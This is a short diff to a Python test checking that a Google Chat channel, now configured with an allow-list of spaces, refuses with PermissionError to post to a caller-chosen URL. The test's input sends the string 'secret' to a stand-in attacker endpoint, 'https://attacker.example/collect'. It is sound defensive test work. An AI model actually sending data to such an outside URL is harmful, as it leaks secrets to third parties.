@@ -119,7 +119,7 @@ def test_google_chat_never_posts_to_caller_chosen_urls(monkeypatch):
             return Result()
 
     monkeypatch.delenv(GoogleChatConfig().incoming_webhook_url_env, raising=False)
-    channel = GoogleChatChannel(GoogleChatConfig())
+    channel = GoogleChatChannel(GoogleChatConfig(allowed_outbound_spaces=["spaces/AAA"]))
     channel.http = Http()
     with pytest.raises(PermissionError):
         asyncio.run(channel.send_text("https://attacker.example/collect", "secret"))
